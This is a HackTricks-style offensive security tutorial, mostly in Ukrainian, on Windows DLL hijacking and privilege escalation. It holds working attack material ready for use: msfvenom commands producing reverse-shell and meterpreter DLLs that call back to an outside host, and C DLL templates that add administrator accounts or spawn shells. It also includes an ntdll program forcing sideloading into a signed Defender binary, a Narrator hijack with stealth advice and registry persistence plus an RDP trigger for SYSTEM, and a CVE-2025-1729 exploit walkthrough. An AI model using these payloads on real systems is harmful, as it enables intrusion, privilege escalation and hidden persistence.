# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає в маніпуляції довіреним додатком з метою завантаження шкідливої DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Він в основному використовується для виконання коду, досягнення персистентності та, рідше, підвищення привілеїв. Незважаючи на те, що тут фокус на ескалації, метод підхоплення лишається однаковим для різних цілей.

### Поширені методи

Існує кілька методів для DLL hijacking, кожен із яких ефективний залежно від стратегії завантаження DLL додатком:

1. **DLL Replacement**: Замінюючи справжню DLL на шкідливу, за бажанням використовуючи DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливої DLL у шляху пошуку вище за легітимну, експлуатуючи порядок пошуку додатку.
3. **Phantom DLL Hijacking**: Створення шкідливої DLL, яку додаток завантажить, вважаючи, що це відсутня потрібна DLL.
4. **DLL Redirection**: Зміна параметрів пошуку, таких як %PATH% або файли .exe.manifest / .exe.local, щоб направити додаток до шкідливої DLL.
5. **WinSxS DLL Replacement**: Заміна легітимної DLL на шкідливу у теці WinSxS — метод, часто пов’язаний з DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливої DLL у керованій користувачем теці разом зі скопійованим додатком, що нагадує Binary Proxy Execution techniques.

## Пошук відсутніх Dll

Найпоширеніший спосіб знайти відсутні Dll у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із sysinternals та встановити **наступні 2 фільтри**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

і показувати лише **File System Activity**:

![](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні dll загалом**, залиште procmon працювати кілька **секунд**.\
Якщо ви шукаєте **відсутню dll у конкретному виконуваному файлі**, слід додати інший фільтр, наприклад "Process Name" "contains" `<exec name>`, виконати файл і зупинити захоплення подій.

## Експлуатація відсутніх Dll

Щоб підвищити привілеї, найкращий шанс — мати можливість **записати dll**, яку процес з підвищеними привілеями спробує завантажити, у одне з місць, де її буде шукати завантажувач. Тобто ми можемо або **записати** dll у папку, яка перевіряється перед папкою з оригінальною dll (рідкісний випадок), або **записати** її в папку, де dll шукають, а оригінальна dll взагалі відсутня в жодній з папок.

### Dll Search Order

У [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) можна знайти детальний опис того, як саме завантажуються Dll.

Windows-додатки шукають DLL за набором попередньо визначених шляхів пошуку, дотримуючись певної послідовності. Проблема DLL hijacking виникає, коли шкідлива DLL стратегічно розміщується в одному з цих каталогів так, що її завантажують раніше за оригінальну DLL. Рішення для запобігання цьому — переконатися, що додаток використовує абсолютні шляхи при зверненні до потрібних DLL.

Нижче наведено порядок пошуку DLL у 32-bit системах:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Це **стандартний** порядок пошуку з увімкненим **SafeDllSearchMode**. Коли він вимкнений, поточний каталог піднімається на друге місце. Щоб вимкнути цю функцію, створіть реєстрове значення **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликають з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі виконуваного модуля, який завантажує LoadLibraryEx.

Нарешті, зверніть увагу, що dll може бути завантажена з вказанням абсолютного шляху замість самого імені. У такому випадку ця dll буде шукатися тільки за цим шляхом (якщо dll має залежності, вони будуть шукатися як звичайні завантажені по імені).

Існують й інші способи змінити порядок пошуку, але тут я їх описувати не буду.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Просунутий спосіб детерміновано вплинути на шлях пошуку DLL для щойно створеного процесу — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS при створенні процесу через нативні API ntdll. Вказавши тут керований атакуючим каталог, можна примусити цільовий процес, який вирішує імпортовану DLL за іменем (без абсолютного шляху і без використання опцій безпечного завантаження), завантажити шкідливу DLL з цього каталогу.

Ключова ідея
- Побудувати параметри процесу за допомогою RtlCreateProcessParametersEx і вказати кастомний DllPath, що вказує на ваш контрольований каталог (наприклад, директорію, де знаходиться ваш dropper/unpacker).
- Створити процес через RtlCreateUserProcess. Коли цільовий бінар вирішить DLL за іменем, завантажувач врахує наданий DllPath під час резолювання, що дозволить надійне sideloading навіть якщо шкідлива DLL не знаходиться поруч із цільовим EXE.

Примітки/обмеження
- Це впливає на дочірній процес, що створюється; це відрізняється від SetDllDirectory, який впливає тільки на поточний процес.
- Цільовий процес має імпортувати або викликати LoadLibrary для DLL за іменем (без абсолютного шляху і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко закодовані абсолютні шляхи не підлягають hijacking. Forwarded exports та SxS можуть змінювати пріоритети.

Мінімальний приклад на C (ntdll, wide strings, спрощена обробка помилок):

<details>
<summary>Повний приклад на C: примусове sideloading DLL через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Приклад експлуатації на практиці
- Розмістіть шкідливий xmllite.dll (що експортує потрібні функції або проксить до справжнього) у вашому каталозі DllPath.
- Запустіть підписаний бінарник, відомий тим, що шукає xmllite.dll за ім'ям, використовуючи наведений вище прийом. завантажувач вирішує імпорт через вказаний DllPath і sideloads ваш DLL.

Ця техніка спостерігалася в реальному житті для побудови багатоступеневих sideloading ланцюжків: початковий лончер скидає допоміжний DLL, який потім породжує підписаний Microsoft, hijackable бінарник з кастомним DllPath, щоб змусити завантаження DLL атакуючого з тимчасового каталогу.


#### Виключення у порядку пошуку dll згідно з документацією Windows

У документації Windows зазначено певні винятки зі стандартного порядку пошуку DLL:

- Коли зустрічається **DLL, що має те саме ім'я, що й вже завантажений в пам'ять**, система оминає звичайний пошук. Натомість вона перевіряє перенаправлення та маніфест, перш ніж за замовчуванням використовувати DLL, вже завантажену в пам'ять. **У цьому випадку система не здійснює пошук DLL**.
- У випадках, коли DLL вважається **known DLL** для поточної версії Windows, система використовуватиме свою версію цієї known DLL разом з будь-якими її залежними DLL, **відмовляючись від процесу пошуку**. Ключ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони були вказані лише своїми **module names**, незалежно від того, чи початковий DLL був ідентифікований через повний шлях.

### Ескалація привілеїв

**Вимоги**:

- Виявити процес, який працює або буде працювати під **іншими привілеями** (горизонтальний або латеральний рух), який **не має певного DLL**.
- Переконатися, що доступ для **запису** доступний для будь-якого **каталогу**, у якому цей **DLL** буде **шукатися**. Це місце може бути каталогом виконуваного файлу або каталогом у system path.

Так, вимоги складні для знаходження, бо **за замовчуванням досить рідко буває, що привілейований виконуваний файл не має DLL**, і ще **рідше, щоб у вас були права запису в папці системного шляху** (за замовчуванням ви не маєте). Але в некоректно налаштованих середовищах це можливо.\
Якщо вам пощастило і ви відповідаєте цим вимогам, варто перевірити проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **головна мета проекту — bypass UAC**, ви можете знайти там PoC Dll hijaking для версії Windows, яку можна використати (ймовірно, просто змінивши шлях до папки, у якій у вас є права запису).

Зверніть увагу, що ви можете **перевірити свої права в папці**, зробивши:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте права доступу всіх папок у PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити імпорти виконуваного файлу та експорти dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного посібника про те, як **abuse Dll Hijacking to escalate privileges** за наявності прав на запис у **System Path folder** дивіться:

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Інші корисні автоматизовані інструменти для виявлення цієї вразливості — це **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll_.

### Приклад

Якщо ви знайдете експлуатований сценарій, однією з найважливіших речей для успішного використання буде **створити a dll that exports at least all the functions the executable will import from it**. Зауважте, що Dll Hijacking корисний для того, щоб [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ви можете знайти приклад **how to create a valid dll** у цьому дослідженні dll hijacking, присвяченому dll hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **next sectio**n можна знайти деякі **basic dll codes**, які можуть стати в нагоді як **templates** або для створення **dll with non required functions exported**.

## **Створення та компіляція Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатний **execute your malicious code when loaded**, але також **expose** і **work** as **exected** by **relaying all the calls to the real library**.

За допомогою інструменту [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви насправді можете **вказати виконуваний файл і вибрати бібліотеку**, яку хочете proxify, і **згенерувати proxified dll**, або **вказати Dll** і **згенерувати proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 — я не бачив x64 версії):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в деяких випадках DLL, яку ви компілюєте, має **експортувати кілька функцій**, які будуть завантажені процесом-жертвою; якщо таких функцій не існує, **бінарний файл не зможе їх завантажити**, і **експлойт зазнає невдачі**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL приклад зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна C DLL з точкою входу в потік</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Дослідження випадку: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe при запуску досі перевіряє передбачуваний localization DLL, специфічний для мови, який можна hijacked для виконання довільного коду та отримання persistence.

Ключові факти
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо у OneCore path існує записуваний DLL, контрольований атакуючим, він завантажується і виконується `DllMain(DLL_PROCESS_ATTACH)`. No exports are required.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Запустіть Narrator і спостерігайте за спробою завантаження вищевказаного шляху.

Мінімальний DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC — тиша
- Наївний hijack буде озвучувати/виділяти елементи UI. Щоб залишатися непомітним, при приєднанні перерахуй потоки Narrator, відкрий головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і виклич `SuspendThread` для нього; продовжуй у власному потоці. Дивись PoC для повного коду.

Trigger and persistence via Accessibility configuration
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- З наведеним вище, запуск Narrator завантажує підкладений DLL. На secure desktop (екран входу), натисни CTRL+WIN+ENTER щоб запустити Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Дозволь класичний рівень безпеки RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключись по RDP до хоста, на екрані входу натисни CTRL+WIN+ENTER щоб запустити Narrator; твій DLL виконається як SYSTEM на secure desktop.
- Виконання припиняється, коли сесія RDP закриється — inject/migrate оперативно.

Bring Your Own Accessibility (BYOA)
- Ти можеш клонувати вбудований запис реєстру Accessibility Tool (AT) (наприклад, CursorIndicator), відредагувати його, щоб він вказував на довільний binary/DLL, імпортувати його, а потім встановити `configuration` на ту назву AT. Це проксує виконання довільного коду в межах Accessibility framework.

Примітки
- Запис у `%windir%\System32` та зміна значень HKLM вимагають прав адміністратора.
- Вся логіка payload може знаходитись у `DLL_PROCESS_ATTACH`; експорти не потрібні.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Хід атаки

1. Як звичайний користувач, розмістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Чекайте, поки запланована задача виконається о 9:30 ранку в контексті поточного користувача.
3. Якщо адміністратор увійшов у систему під час виконання задачі, шкідливий DLL запускається в сесії адміністратора з medium integrity.
4. Скомбінуйте стандартні UAC bypass techniques для ескалації привілеїв з medium integrity до SYSTEM.

## Посилання

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
